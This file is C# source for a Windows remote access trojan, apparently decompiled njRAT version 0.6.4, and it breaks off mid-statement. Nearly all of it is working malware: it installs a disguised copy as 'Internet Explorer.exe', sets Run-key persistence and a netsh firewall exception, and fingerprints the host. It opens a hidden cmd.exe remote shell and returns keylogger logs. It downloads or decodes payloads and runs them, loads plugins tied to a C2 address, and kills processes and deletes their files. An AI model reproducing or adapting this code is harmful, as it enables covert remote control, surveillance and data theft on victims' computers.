using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ClassLibrary1
{
    /// class ok
    [StandardModule]
    internal sealed class OK
    {
        public static string VN = "KF9fX19fX19fX19fX19GS19fX19fX19fX19fX18p";
        public static string VR = "0.6.4";
        public static Mutex MT = null;
        public static string EXE = "Internet Explorer.exe";
        public static string DR = "TEMP";
        public static string RG = "3e936482e28cca4a48b713452330a269";
        public static string ip = "127.0.0.1";
        public static string port = "1177";
        public static string split = "|'|'|";
        public static bool BD = false;
        public static bool Idr = true;
        public static bool IsF = false;
        public static bool Isu = true;
        public static FileInfo AppFileInfo = new FileInfo(Application.ExecutablePath);
        public static FileStream FS;
        public static Computer F = new Computer();
        public static string endof = "[endof]";
        public static Spy spy = null;
        private static Process Pro;
        public static bool ON = false;
        public static string AutoRunKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        public static TcpClient tcp = null;
        private static MemoryStream MeM = new MemoryStream();
        private static byte[] Message = new byte[5121];
        private static string lastcap = "";

        [DllImport("psapi")]
        public static extern bool EmptyWorkingSet(long hProcess);

        [DllImport("ntdll")]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass,
            ref int processInformation, int processInformationLength);

        [DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern bool capGetDriverDescriptionA(short wDriver,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize,
            ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle,
            int MaxLength);

        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern int GetWindowTextLengthA(long hwnd);

        public static void DRegValue(string n)
        {
            try
            {
                F.Registry.CurrentUser.OpenSubKey("Software\\" + RG, true).DeleteValue(n);
            }
            catch (Exception expr_2C)
            {
                ProjectData.SetProjectError(expr_2C);
                ProjectData.ClearProjectError();
            }
        }

        public static string GRegValue(string n)
        {
            string result;
            try
            {
                result = Conversions.ToString(F.Registry.CurrentUser.OpenSubKey("Software\\" + RG).GetValue(n, ""));
            }
            catch (Exception expr_36)
            {
                ProjectData.SetProjectError(expr_36);
                result = "";
                ProjectData.ClearProjectError();
            }
            return result;
        }

        public static object SRegValue(string n, string t)
        {
            object result;
            try
            {
                F.Registry.CurrentUser.CreateSubKey("Software\\" + RG).SetValue(n, t);
                result = true;
            }
            catch (Exception expr_33)
            {
                ProjectData.SetProjectError(expr_33);
                result = false;
                ProjectData.ClearProjectError();
            }
            return result;
        }

        public static string Info()
        {
            string text = "lv" + split;
            try
            {
                if (Operators.CompareString(GRegValue("vn"), "", false) == 0)
                {
                    string arg_50_0 = text;
                    //28 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 46 4b (_____________FK
                   // 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 29       _____________)


                    string text2 = FromBase64(ref VN) + "_" + HardDiskSerial();
                    text = arg_50_0 + ToBase64(ref text2) + split;
                }
                else
                {
                    string arg_89_0 = text;
                    string text2 = GRegValue("vn");
                    string text3 = FromBase64(ref text2) + "_" + HardDiskSerial();
                    text = arg_89_0 + ToBase64(ref text3) + split;
                }
            }
            catch (Exception expr_91)
            {
                ProjectData.SetProjectError(expr_91);
                string arg_AC_0 = text;
                string text3 = HardDiskSerial();
                text = arg_AC_0 + ToBase64(ref text3) + split;
                ProjectData.ClearProjectError();
            }
            try
            {
                text = text + Environment.MachineName + split;
            }
            catch (Exception expr_CC)
            {
                ProjectData.SetProjectError(expr_CC);
                text = text + "??" + split;
                ProjectData.ClearProjectError();
            }
            try
            {
                text = text + Environment.UserName + split;
            }
            catch (Exception expr_FE)
            {
                ProjectData.SetProjectError(expr_FE);
                text = text + "??" + split;
                ProjectData.ClearProjectError();
            }
            text = text + LastWriteTime() + split;
            text = text + "" + split;
            try
            {
                text +=
                    F.Info.OSFullName.Replace("Microsoft", "")
                        .Replace("Windows", "Win")
                        .Replace("®", "")
                        .Replace("™", "")
                        .Replace("  ", " ")
                        .Replace(" Win", "Win");
            }
            catch (Exception expr_1B1)
            {
                ProjectData.SetProjectError(expr_1B1);
                text += "??";
                ProjectData.ClearProjectError();
            }
            text += "SP";
            checked
            {
                try
                {
                    string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary);
                    if (array.Length == 1)
                    {
                        text += "0";
                    }
                    text += array[array.Length - 1];
                }
                catch (Exception expr_214)
                {
                    ProjectData.SetProjectError(expr_214);
                    text += "0";
                    ProjectData.ClearProjectError();
                }
                try
                {
                    if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
                    {
                        text = text + " x64" + split;
                    }
                    else
                    {
                        text = text + " x86" + split;
                    }
                }
                catch (Exception expr_267)
                {
                    ProjectData.SetProjectError(expr_267);
                    text += split;
                    ProjectData.ClearProjectError();
                }
                if (Cam())
                {
                    text = text + "Yes" + split;
                }
                else
                {
                    text = text + "No" + split;
                }
                text = text + VR + split;
                text = text + ".." + split;
                text = text + WorkedWindowsName() + split;
                string text4 = "";
                try
                {
                    string[] valueNames =
                        F.Registry.CurrentUser.CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.Default)
                            .GetValueNames();
                    for (int i = 0; i < valueNames.Length; i++)
                    {
                        string text5 = valueNames[i];
                        if (text5.Length == 32)
                        {
                            text4 = text4 + text5 + ",";
                        }
                    }
                }
                catch (Exception expr_345)
                {
                    ProjectData.SetProjectError(expr_345);
                    ProjectData.ClearProjectError();
                }
                return text + text4;
            }
        }

        public static string LastWriteTime()
        {
            string result;
            try
            {
                result = AppFileInfo.LastWriteTime.ToString("yyyy-MM-dd");
            }
            catch (Exception expr_1A)
            {
                ProjectData.SetProjectError(expr_1A);
                result = "unknown";
                ProjectData.ClearProjectError();
            }
            return result;
        }

        public static string ToBase64(ref string s)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(s);
            return Convert.ToBase64String(bytes);
        }

        public static string FromBase64(ref string s)
        {
            byte[] bytes = Convert.FromBase64String(s);
            return Encoding.UTF8.GetString(bytes);
        }

        public static string RandomStr(int c)
        {
            VBMath.Randomize();
            var random = new Random();
            string text = "";
            string text2 = "abcdefghijklmnopqrstuvwxyz";
            checked
            {
                for (int i = 1; i <= c; i++)
                {
                    text += Conversions.ToString(text2[random.Next(0, text2.Length)]);
                }
                return text;
            }
        }

        public static byte[] GetBytes( string S)
        {
            return Encoding.Default.GetBytes(S);
        }

        public static string GetString( byte[] B)
        {
            return Encoding.Default.GetString(B);
        }

        public static Array fx(byte[] b, string spl)
        {
            var list = new List<byte[]>();
            var memoryStream = new MemoryStream();
            var memoryStream2 = new MemoryStream();
            string[] array = Strings.Split(GetString( b), spl, -1, CompareMethod.Binary);
            memoryStream.Write(b, 0, array[0].Length);
            checked
            {
                memoryStream2.Write(b, array[0].Length + spl.Length, b.Length - (array[0].Length + spl.Length));
                list.Add(memoryStream.ToArray());
                list.Add(memoryStream2.ToArray());
                memoryStream.Dispose();
                memoryStream2.Dispose();
                return list.ToArray();
            }
        }

        public static byte[] ZIP(byte[] B, ref bool CM)
        {
            checked
            {
                if (CM)
                {
                    var memoryStream = new MemoryStream();
                    var gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, true);
                    gZipStream.Write(B, 0, B.Length);
                    gZipStream.Dispose();
                    memoryStream.Position = 0L;
                    var array = new byte[(int) memoryStream.Length + 1];
                    memoryStream.Read(array, 0, array.Length);
                    memoryStream.Dispose();
                    return array;
                }
                var memoryStream2 = new MemoryStream(B);
                var gZipStream2 = new GZipStream(memoryStream2, CompressionMode.Decompress);
                var array2 = new byte[4];
                memoryStream2.Position = memoryStream2.Length - 5L;
                memoryStream2.Read(array2, 0, 4);
                int num = BitConverter.ToInt32(array2, 0);
                memoryStream2.Position = 0L;
                var array3 = new byte[num - 1 + 1];
                gZipStream2.Read(array3, 0, num);
                gZipStream2.Dispose();
                memoryStream2.Dispose();
                return array3;
            }
        }

        public static bool Cam()
        {
            checked
            {
                try
                {
                    int num = 0;
                    while (true)
                    {
                        var arg_21_0 = (short) num;
                        string text = Strings.Space(100);
                        int arg_21_2 = 100;
                        string text2 = null;
                        if (capGetDriverDescriptionA(arg_21_0, ref text, arg_21_2, ref text2, 100))
                        {
                            break;
                        }
                        num++;
                        if (num > 4)
                        {
                            goto IL_2C;
                        }
                    }
                    return true;
                    IL_2C:
                    ;
                }
                catch (Exception expr_2E)
                {
                    ProjectData.SetProjectError(expr_2E);
                    ProjectData.ClearProjectError();
                }
                return false;
            }
        }
        //* Retrieves a handle to the foreground window (the window with which the user is currently working). The system assigns a slightly higher priority to the thread that creates the foreground window than it does to other threads
        public static string WorkedWindowsName()
        {
            checked
            {
                string result;
                try
                {
                    IntPtr foregroundWindow = GetForegroundWindow();
                    if (foregroundWindow == IntPtr.Zero)
                    {
                        string text = " ";
                        result = ToBase64(ref text);
                    }
                    else
                    {
                        int windowTextLengthA = GetWindowTextLengthA((long) foregroundWindow);
                        string text2 = Strings.StrDup(windowTextLengthA + 1, "*");
                        GetWindowTextA(foregroundWindow, ref text2, windowTextLengthA + 1);
                        int num = 0;
                        GetWindowThreadProcessId(foregroundWindow, ref num);
                        if (num != 0)
                        {
                            try
                            {
                                string text = Process.GetProcessById(num).MainWindowTitle;
                                result = ToBase64(ref text);
                                return result;
                            }
                            catch (Exception expr_74)
                            {
                                ProjectData.SetProjectError(expr_74);
                                result = ToBase64(ref text2);
                                ProjectData.ClearProjectError();
                                return result;
                            }
                        }
                        result = ToBase64(ref text2);
                    }
                }
                catch (Exception expr_94)
                {
                    ProjectData.SetProjectError(expr_94);
                    string text = " ";
                    result = ToBase64(ref text);
                    ProjectData.ClearProjectError();
                }
                return result;
            }
        }

        public static string HardDiskSerial()
        {
            string result;
            try
            {
                string text = Interaction.Environ("SystemDrive") + "\\";
                string text2 = null;
                int arg_2F_2 = 0;
                int num = 0;
                int num2 = 0;
                string text3 = null;
                int number = 0;
                GetVolumeInformationA(ref text, ref text2, arg_2F_2, ref number, ref num, ref num2, ref text3, 0);
                result = Conversion.Hex(number);
               
            }
            catch (Exception expr_3E)
            {
                ProjectData.SetProjectError(expr_3E);
                result = "ERR";
                ProjectData.ClearProjectError();
            }
            return result;
        }

        public static object Plugin(byte[] ByteOfPlugin, string ClassName)
        {
            Assembly assembly = Assembly.Load(ByteOfPlugin);
            Module[] modules = assembly.GetModules();
            checked
            {
                for (int i = 0; i < modules.Length; i++)
                {
                    Module module = modules[i];
                    Type[] types = module.GetTypes();
                    for (int j = 0; j < types.Length; j++)
                    {
                        Type type = types[j];
                        if (type.FullName.EndsWith("." + ClassName))
                        {
                            return module.Assembly.CreateInstance(type.FullName);
                        }
                    }
                }
                return null;
            }
        }

        public static void ED()
        {
            pr(0);
        }

        private static bool CompDir(FileInfo F1, FileInfo F2)
        {
            if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
            {
                return false;
            }
            DirectoryInfo directoryInfo = F1.Directory;
            DirectoryInfo directoryInfo2 = F2.Directory;
            while (Operators.CompareString(directoryInfo.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
            {
                directoryInfo = directoryInfo.Parent;
                directoryInfo2 = directoryInfo2.Parent;
                if (directoryInfo == null & directoryInfo2 == null)
                {
                    return true;
                }
                if (directoryInfo == null)
                {
                    return false;
                }
                if (directoryInfo2 == null)
                {
                    return false;
                }
            }
            return false;
        }

        public static void Install()
        {
            if (Idr)
            {
                if (!CompDir(AppFileInfo, new FileInfo(Interaction.Environ(DR).ToLower() + "\\" + EXE.ToLower())))
                {
                    try
                    {
                        if (File.Exists(Interaction.Environ(DR) + "\\" + EXE))
                        {
                            File.Delete(Interaction.Environ(DR) + "\\" + EXE);
                        }
                        File.Copy(AppFileInfo.FullName, Interaction.Environ(DR) + "\\" + EXE, true);
                        Process.Start(Interaction.Environ(DR) + "\\" + EXE);
                        ProjectData.EndApp();
                    }
                    catch (Exception expr_D1)
                    {
                        ProjectData.SetProjectError(expr_D1);
                        ProjectData.EndApp();
                        ProjectData.ClearProjectError();
                    }
                }
            }
            try
            {
                Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
            }
            catch (Exception expr_F6)
            {
                ProjectData.SetProjectError(expr_F6);
                ProjectData.ClearProjectError();
            }
            try
            {
                Interaction.Shell(string.Concat(new[]
                {
                    "netsh firewall add allowedprogram \"",
                    AppFileInfo.FullName,
                    "\" \"",
                    AppFileInfo.Name,
                    "\" ENABLE"
                }), AppWinStyle.Hide, false, -1);
            }
            catch (Exception expr_155)
            {
                ProjectData.SetProjectError(expr_155);
                ProjectData.ClearProjectError();
            }
            if (Isu)
            {
                try
                {
                    F.Registry.CurrentUser.OpenSubKey(AutoRunKey, true).SetValue(RG, "\"" + AppFileInfo.FullName + "\" ..");
                }
                catch (Exception expr_1AC)
                {
                    ProjectData.SetProjectError(expr_1AC);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    F.Registry.LocalMachine.OpenSubKey(AutoRunKey, true).SetValue(RG, "\"" + AppFileInfo.FullName + "\" ..");
                }
                catch (Exception expr_1F9)
                {
                    ProjectData.SetProjectError(expr_1F9);
                    ProjectData.ClearProjectError();
                }
            }
            if (IsF)
            {
                try
                {
                    File.Copy(AppFileInfo.FullName,
                        Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", true);
                    FS =
                        new FileStream(
                            Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe",
                            FileMode.Open);
                }
                catch (Exception expr_25F)
                {
                    ProjectData.SetProjectError(expr_25F);
                    ProjectData.ClearProjectError();
                }
            }
            Thread.Sleep(1000);
        }

        private static void ConsoleOut(object a, object e)
        {
            try
            {
                string arg_4A_0 = "rs";
                string arg_4A_1 = split;
                string text =
                    Conversions.ToString(NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null));
                string arg_4A_2 = ToBase64(ref text);
                NewLateBinding.LateSetComplex(e, null, "Data", new object[]
                {
                    text
                }, null, null, true, false);
                Send(arg_4A_0 + arg_4A_1 + arg_4A_2);
            }
            catch (Exception expr_57)
            {
                ProjectData.SetProjectError(expr_57);
                ProjectData.ClearProjectError();
            }
        }

        private static void ProgressExit()
        {
            try
            {
                Send("rsc");
            }
            catch (Exception expr_0D)
            {
                ProjectData.SetProjectError(expr_0D);
                ProjectData.ClearProjectError();
            }
        }
        //handle recived messge
        public static void Ind(byte[] b)
        {
            string[] array = Strings.Split(GetString( b), split, -1, CompareMethod.Binary);
            checked
            {
                try
                {
                    string left = array[0];
                    if (Operators.CompareString(left, "proc", false) == 0)
                    {
                        string left2 = array[1];
                        if (Operators.CompareString(left2, "~", false) == 0)
                        {
                            Send(string.Concat(new[]
                            {
                                "proc",
                                split,
                                "pid",
                                split,
                                Conversions.ToString(Process.GetCurrentProcess().Id)
                            }));
                            Process[] processes = Process.GetProcesses();
                            Send(string.Concat(new[]
                            {
                                "proc",
                                split,
                                "~",
                                split,
                                Conversions.ToString(processes.Length)
                            }));
                            int num = 0;
                            string text = "";
                            Process[] array2 = processes;
                            int i = 0;
                            while (i < array2.Length)
                            {
                                Process process = array2[i];
                                num++;
                                try
                                {
                                    try
                                    {
                                        string text2 = "";
                                        try
                                        {
                                            string text3 = process.MainModule.FileVersionInfo.FileDescription;
                                            text2 = ToBase64(ref text3);
                                        }
                                        catch (Exception expr_124)
                                        {
                                            ProjectData.SetProjectError(expr_124);
                                            ProjectData.ClearProjectError();
                                        }
                                        text = string.Concat(new[]
                                        {
                                            text,
                                            split,
                                            Conversions.ToString(process.Id),
                                            ",",
                                            process.MainModule.FileName,
                                            ",",
                                            text2
                                        });
                                        goto IL_3A0;
                                    }
                                    catch (Exception expr_18D)
                                    {
                                        ProjectData.SetProjectError(expr_18D);
                                        var array3 = new string[7];
                                        array3[0] = text;
                                        array3[1] = split;
                                        array3[2] = Conversions.ToString(process.Id);
                                        array3[3] = ",";
                                        array3[4] = process.MainModule.FileVersionInfo.FileName;
                                        array3[5] = ",";
                                        string[] arg_1FE_0 = array3;
                                        int arg_1FE_1 = 6;
                                        string text3 = process.MainModule.FileVersionInfo.FileDescription;
                                        arg_1FE_0[arg_1FE_1] = ToBase64(ref text3);
                                        text = string.Concat(array3);
                                        ProjectData.ClearProjectError();
                                        goto IL_3A0;
                                    }
                                }
                                catch (Exception expr_211)
                                {
                                    ProjectData.SetProjectError(expr_211);
                                    string text4 = "";
                                    try
                                    {
                                        string text3 =
                                            FileVersionInfo.GetVersionInfo(Interaction.Environ("windir") +
                                                                           "\\system32\\" + process.ProcessName + ".exe")
                                                .FileDescription;
                                        text4 = ToBase64(ref text3);
                                    }
                                    catch (Exception expr_256)
                                    {
                                        ProjectData.SetProjectError(expr_256);
                                        ProjectData.ClearProjectError();
                                    }
                                    if (
                                        File.Exists(Interaction.Environ("windir") + "\\system32\\" + process.ProcessName +
                                                    ".exe"))
                                    {
                                        var fileInfo =
                                            new FileInfo(Interaction.Environ("windir") + "\\system32\\" +
                                                         process.ProcessName + ".exe");
                                        text = string.Concat(new[]
                                        {
                                            text,
                                            split,
                                            Conversions.ToString(process.Id),
                                            ",",
                                            fileInfo.FullName,
                                            ",",
                                            text4
                                        });
                                    }
                                    else
                                    {
                                        text = string.Concat(new[]
                                        {
                                            text,
                                            split,
                                            Conversions.ToString(process.Id),
                                            ",",
                                            process.ProcessName,
                                            ",",
                                            text4
                                        });
                                    }
                                    ProjectData.ClearProjectError();
                                    goto IL_3A0;
                                }
                                goto IL_35D;
                                IL_395:
                                i++;
                                continue;
                                IL_35D:
                                num = 0;
                                var thread = new Thread(a0 => Send(Conversions.ToString(a0)), 1);
                                thread.Start("proc" + split + "!" + text);
                                text = "";
                                goto IL_395;
                                IL_3A0:
                                if (num == 10)
                                {
                                    goto IL_35D;
                                }
                                goto IL_395;
                            }
                            if (Operators.CompareString(text, "", false) != 0)
                            {
                                Send("proc" + split + "!" + text);
                            }
                        }
                        else
                        {
                            if (Operators.CompareString(left2, "k", false) == 0)
                            {
                                int arg_3F4_0 = 2;
                                int num2 = array.Length - 1;
                                for (int j = arg_3F4_0; j <= num2; j++)
                                {
                                    try
                                    {
                                        Process.GetProcessById(Conversions.ToInteger(array[j])).Kill();
                                        Send(string.Concat(new[]
                                        {
                                            "proc",
                                            split,
                                            "RM",
                                            split,
                                            array[j]
                                        }));
                                    }
                                    catch (Exception expr_455)
                                    {
                                        ProjectData.SetProjectError(expr_455);
                                        Exception ex = expr_455;
                                        Send(string.Concat(new[]
                                        {
                                            "proc",
                                            split,
                                            "ER",
                                            split,
                                            ex.Message
                                        }));
                                        ProjectData.ClearProjectError();
                                    }
                                }
                            }
                            else
                            {
                                if (Operators.CompareString(left2, "kd", false) == 0)
                                {
                                    int arg_4D3_0 = 2;
                                    int num3 = array.Length - 1;
                                    for (int k = arg_4D3_0; k <= num3; k++)
                                    {
                                        try
                                        {
                                            string text5 = "";
                                            Process process2 = Process.GetProcessById(Conversions.ToInteger(array[k]));
                                            try
                                            {
                                                text5 = process2.MainModule.FileVersionInfo.FileName;
                                            }
                                            catch (Exception expr_50A)
                                            {
                                                ProjectData.SetProjectError(expr_50A);
                                                try
                                                {
                                                    text5 = process2.MainModule.FileName;
                                                }
                                                catch (Exception expr_521)
                                                {
                                                    ProjectData.SetProjectError(expr_521);
                                                    ProjectData.ClearProjectError();
                                                }
                                                ProjectData.ClearProjectError();
                                            }
                                            process2.Kill();
                                            Send(string.Concat(new[]
                                            {
                                                "proc",
                                                split,
                                                "RM",
                                                split,
                                                array[k]
                                            }));
                                            process2 = null;
                                            Thread.Sleep(2000);
                                            File.Delete(text5);
                                            Send(string.Concat(new[]
                                            {
                                                "proc",
                                                split,
                                                "ER",
                                                split,
                                                "Deleted ",
                                                text5
                                            }));
                                        }
                                        catch (Exception expr_5DC)
                                        {
                                            ProjectData.SetProjectError(expr_5DC);
                                            Exception ex2 = expr_5DC;
                                            Send(string.Concat(new[]
                                            {
                                                "proc",
                                                split,
                                                "ER",
                                                split,
                                                ex2.Message
                                            }));
                                            ProjectData.ClearProjectError();
                                        }
                                    }
                                }
                                else
                                {
                                    if (Operators.CompareString(left2, "re", false) == 0)
                                    {
                                        int arg_65A_0 = 2;
                                        int num4 = array.Length - 1;
                                        for (int l = arg_65A_0; l <= num4; l++)
                                        {
                                            try
                                            {
                                                string text6 = "";
                                                Process process3 =
                                                    Process.GetProcessById(Conversions.ToInteger(array[l]));
                                                try
                                                {
                                                    text6 = process3.MainModule.FileVersionInfo.FileName;
                                                }
                                                catch (Exception expr_691)
                                                {
                                                    ProjectData.SetProjectError(expr_691);
                                                    try
                                                    {
                                                        text6 = process3.MainModule.FileName;
                                                    }
                                                    catch (Exception expr_6A8)
                                                    {
                                                        ProjectData.SetProjectError(expr_6A8);
                                                        text6 = Interaction.Environ("windir") + "\\system32\\" +
                                                                process3.ProcessName + ".exe";
                                                        ProjectData.ClearProjectError();
                                                    }
                                                    ProjectData.ClearProjectError();
                                                }
                                                process3.Kill();
                                                Send(string.Concat(new[]
                                                {
                                                    "proc",
                                                    split,
                                                    "RM",
                                                    split,
                                                    array[l]
                                                }));
                                                process3 = null;
                                                Process.Start(text6);
                                                Send(string.Concat(new[]
                                                {
                                                    "proc",
                                                    split,
                                                    "ER",
                                                    split,
                                                    "Started ",
                                                    text6
                                                }));
                                            }
                                            catch (Exception expr_77C)
                                            {
                                                ProjectData.SetProjectError(expr_77C);
                                                Exception ex3 = expr_77C;
                                                Send(string.Concat(new[]
                                                {
                                                    "proc",
                                                    split,
                                                    "ER",
                                                    split,
                                                    ex3.Message
                                                }));
                                                ProjectData.ClearProjectError();
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        if (Operators.CompareString(left, "rss", false) == 0)
                        {
                            try
                            {
                                Pro.Kill();
                            }
                            catch (Exception expr_7FE)
                            {
                                ProjectData.SetProjectError(expr_7FE);
                                ProjectData.ClearProjectError();
                            }
                            Pro = new Process();
                            Pro.StartInfo.RedirectStandardOutput = true;
                            Pro.StartInfo.RedirectStandardInput = true;
                            Pro.StartInfo.RedirectStandardError = true;
                            Pro.StartInfo.FileName = "cmd.exe";
                            Pro.OutputDataReceived += ConsoleOut;
                            Pro.ErrorDataReceived += ConsoleOut;
                            Pro.Exited += delegate { ProgressExit(); };
                            Pro.StartInfo.UseShellExecute = false;
                            Pro.StartInfo.CreateNoWindow = true;
                            Pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            Pro.EnableRaisingEvents = true;
                            Send("rss");
                            Pro.Start();
                            Pro.BeginErrorReadLine();
                            Pro.BeginOutputReadLine();
                        }
                        else
                        {
                            if (Operators.CompareString(left, "rs", false) == 0)
                            {
                                Pro.StandardInput.WriteLine(FromBase64(ref array[1]));
                            }
                            else
                            {
                                if (Operators.CompareString(left, "rsc", false) == 0)
                                {
                                    try
                                    {
                                        Pro.Kill();
                                    }
                                    catch (Exception expr_952)
                                    {
                                        ProjectData.SetProjectError(expr_952);
                                        ProjectData.ClearProjectError();
                                    }
                                    Pro = null;
                                }
                                else
                                {
                                    if (Operators.CompareString(left, "kl", false) == 0)
                                    {
                                        Send("kl" + split + ToBase64(ref spy.Logs));
                                    }
                                    else
                                    {
                                        if (Operators.CompareString(left, "inf", false) == 0)
                                        {
                                            string text7 = "inf" + split;
                                            if (Operators.CompareString(GRegValue("vn"), "", false) == 0)
                                            {
                                                string arg_A09_0 = text7;
                                                string text3 = FromBase64(ref VN) + "_" + HardDiskSerial();
                                                text7 = arg_A09_0 + ToBase64(ref text3) + split;
                                            }
                                            else
                                            {
                                                string arg_A44_0 = text7;
                                                string text3 = GRegValue("vn");
                                                string text8 = FromBase64(ref text3) + "_" + HardDiskSerial();
                                                text7 = arg_A44_0 + ToBase64(ref text8) + split;
                                            }
                                            text7 = string.Concat(new[]
                                            {
                                                text7,
                                                ip,
                                                ":",
                                                port,
                                                split
                                            });
                                            text7 = text7 + DR + split;
                                            text7 = text7 + EXE + split;
                                            text7 += Process.GetCurrentProcess().ProcessName;
                                            Send(text7);
                                        }
                                        else
                                        {
                                            if (Operators.CompareString(left, "prof", false) == 0)
                                            {
                                                string left3 = array[1];
                                                if (Operators.CompareString(left3, "~", false) == 0)
                                                {
                                                    SRegValue(array[2], array[3]);
                                                }
                                                else
                                                {
                                                    if (Operators.CompareString(left3, "!", false) == 0)
                                                    {
                                                        SRegValue(array[2], array[3]);
                                                        Send(string.Concat(new[]
                                                        {
                                                            "getvalue",
                                                            split,
                                                            array[1],
                                                            split,
                                                            GRegValue(array[1])
                                                        }));
                                                    }
                                                    else
                                                    {
                                                        if (Operators.CompareString(left3, "@", false) == 0)
                                                        {
                                                            DRegValue(array[2]);
                                                        }
                                                    }
                                                }
                                            }
                                            else
                                            {
                                                if (Operators.CompareString(left, "rn", false) == 0)
                                                {
                                                    byte[] bytes = null;
                                                    if (!array[2].ToLower().StartsWith("http"))
                                                    {
                                                        try
                                                        {
                                                            byte[] arg_BC0_0 = Convert.FromBase64String(array[2]);
                                                            bool flag = false;
                                                            bytes = ZIP(arg_BC0_0, ref flag);
                                                            goto IL_C4D;
                                                        }
                                                        catch (Exception expr_BCC)
                                                        {
                                                            ProjectData.SetProjectError(expr_BCC);
                                                            Send("MSG" + split + "Execute ERROR");
                                                            Send("bla");
                                                            ProjectData.ClearProjectError();
                                                            return;
                                                        }
                                                    }
                                                    var webClient = new WebClient();
                                                    try
                                                    {
                                                        bytes = webClient.DownloadData(array[2]);
                                                    }
                                                    catch (Exception expr_C17)
                                                    {
                                                        ProjectData.SetProjectError(expr_C17);
                                                        Send("MSG" + split + "Download ERROR");
                                                        Send("bla");
                                                        ProjectData.ClearProjectError();
                                                        return;
                                                    }
                                                    IL_C4D:
                                                    Send("bla");
                                                    string text9 = string.Concat(new[]
                                                    {
                                                        Interaction.Environ("temp"),
                                                        "\\",
                                                        RandomStr(10),
                                                        ".",
                                                        array[1]
                                                    });
                                                    File.WriteAllBytes(text9, bytes);
                                                    Process.Start(text9);
                                                    Send("MSG" + split + "Executed As " + new FileInfo(text9).Name);
                                                }
                                                else
                                                {
                                                    if (Operators.CompareString(left, "inv", false) == 0)
                                                    {
                                                        Send("bla");
                                                        string text10 = GRegValue(array[1]);
                                                        byte[] array4;
                                                        if (text10.Length > 0)
                                                        {
                                                            array4 = Convert.FromBase64String(text10);
                                                            Send(string.Concat(new[]
                                                            {
                                                                "pl",
                                                                split,
                                                                array[1],
                                                                split,
                                                                Conversions.ToString(0)
                                                            }));
                                                        }
                                                        else
                                                        {
                                                            if (array[3].Length == 1)
                                                            {
                                                                Send(string.Concat(new[]
                                                                {
                                                                    "pl",
                                                                    split,
                                                                    array[1],
                                                                    split,
                                                                    "False"
                                                                }));
                                                                return;
                                                            }
                                                            byte[] arg_DB5_0 = Convert.FromBase64String(array[3]);
                                                            bool flag = false;
                                                            array4 = ZIP(arg_DB5_0, ref flag);
                                                            if (
                                                                Conversions.ToBoolean(SRegValue(array[1],
                                                                    Convert.ToBase64String(array4))))
                                                            {
                                                                Send(string.Concat(new[]
                                                                {
                                                                    "pl",
                                                                    split,
                                                                    array[1],
                                                                    split,
                                                                    Conversions.ToString(0)
                                                                }));
                                                            }
                                                        }
                                                        object objectValue =
                                                            RuntimeHelpers.GetObjectValue(Plugin(array4, "A"));
                                                        NewLateBinding.LateSet(objectValue, null, "h", new object[]
                                                        {
                                                            ip
                                                        }, null, null);
                                                        NewLateBinding.LateSet(objectValue, null, "p", new object[]
                                                        {
                                                            port
                                                        }, null, null);
                                                        NewLateBinding.LateSet(objectValue, null, "osk", new object[]
                                                        {
                                                            array[2]
                                                        }, null, null);
                                                        NewLateBinding.LateCall(objectValue, null, "start",
                                                            new object[0], null, null, null, true);
                                                        while (
                                                            !Conversions.ToBoolean(Operators.OrObject(!ON,
                                                                Operators.CompareObjectEqual(
                                                                    NewLateBinding.LateGet(objectValue, null, "Off",
                                                                        new object[0], null, null, null), true, false))))
                                                        {
                                                            Thread.Sleep(1);
                                                        }
                                                        NewLateBinding.LateSet(objectValue, null, "off", new object[]
                                                        {
                                                            true
